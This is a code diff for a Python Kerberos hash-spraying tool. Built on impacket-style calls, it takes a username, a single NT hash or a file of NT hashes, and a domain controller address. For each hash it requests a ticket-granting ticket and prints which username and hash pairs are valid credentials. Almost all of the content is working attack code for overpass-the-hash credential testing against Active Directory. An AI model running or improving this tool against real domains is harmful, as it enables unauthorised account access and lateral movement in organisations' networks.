@@ -20,33 +20,50 @@ class PschittKerberos:
         try:
             principal_krb = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
             auth = getKerberosTGT(principal_krb, self.password, self.domain, lmhash, unhexlify(nthash), self.aesKey, self.dc_ip)
-            print("result :", auth)
+            return True
         except KerberosError as e:
-            print(e)
-            return
+            return e
         except socket.error as e:
             print('[-] Could not connect to DC')
             return
 
+
+
 def main():
     parser = argparse.ArgumentParser(description="Ca spray fort !")
     parser.add_argument('-username', help='Username used to spray NTLM hash(es)')
-    parser.add_argument('-hashes', help="NT hash to spray")
+    parser.add_argument('-hash', help="NT hash to spray")
     parser.add_argument('-hashfile', help='NT hashes file to spray')
     parser.add_argument('-domain', required=True, help="Target domain")
     parser.add_argument('-dc', help="DC IP")
 
     args = parser.parse_args()
 
-    kerberos_sprayer = PschittKerberos(
-            user=args.username,
-            domain=args.domain,
-            hash=args.hashes,
-            password=None,
-            aesKey=None,
-            dc_ip=args.dc
-        )
-    kerberos_sprayer.spray()
+    
+    # IF file is give on argument
+    if args.hashfile :
+        with open(args.hashfile, 'r') as hash:
+            for line in hash:
+                hash = line.strip()
+                kerberos_sprayer = PschittKerberos(user=args.username, domain=args.domain, hash=hash, password=None, aesKey=None, dc_ip=args.dc)
+                match kerberos_sprayer.spray():
+                    case True :
+                        print(f'[+] {args.username}:{hash} is valid creds')
+                    case _ :
+                        print(f'[-] {args.username}:{hash}', kerberos_sprayer.spray())
+    # IF just one is give on argument
+    if args.hash :
+        kerberos_sprayer = PschittKerberos(user=args.username, domain=args.domain, hash=args.hash, password=None, aesKey=None, dc_ip=args.dc)
+        match kerberos_sprayer.spray():
+            case True :
+                print(f'[+] {args.username}:{args.hash} is valid creds')
+            case _ :
+                print(f'[-] {args.username}:{args.hash}', kerberos_sprayer.spray())
+
+    if not args.hash and not args.hashfile:
+        parser.error('-hash or -hashfile is require')
+
+
 
 if __name__ == "__main__":
     main()
